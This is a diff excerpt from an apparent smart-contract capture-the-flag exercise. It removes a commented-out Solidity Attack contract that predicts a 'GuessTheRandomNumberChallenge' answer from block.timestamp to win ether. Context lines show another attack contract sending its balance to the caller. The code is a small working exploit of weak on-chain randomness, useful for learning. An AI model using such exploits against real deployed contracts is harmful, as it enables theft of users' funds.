@@ -39,27 +39,3 @@ contract Attack {
         payable(msg.sender).transfer(address(this).balance);
     }
 }
-
-// pragma solidity ^0.8.0;
-
-// import "./GuessTheRandomNumberChallenge.sol";
-
-// contract Attack {
-//     GuessTheRandomNumberChallenge public challenge;
-
-//     event AttackSuccessful(uint256 guessedNumber);
-
-//     constructor(address challengeAddress) {
-//         challenge = GuessTheRandomNumberChallenge(challengeAddress);
-//     }
-
-//     function attack() external payable {
-//         require(msg.value == 1 ether, "Send 1 ether to perform the attack");
-
-//         uint256 guessedNumber = uint256(
-//             keccak256(abi.encodePacked(block.timestamp))
-//         ) % 10;
-//         challenge.guess{value: 1 ether}(guessedNumber);
-//         emit AttackSuccessful(guessedNumber);
-//     }
-// }
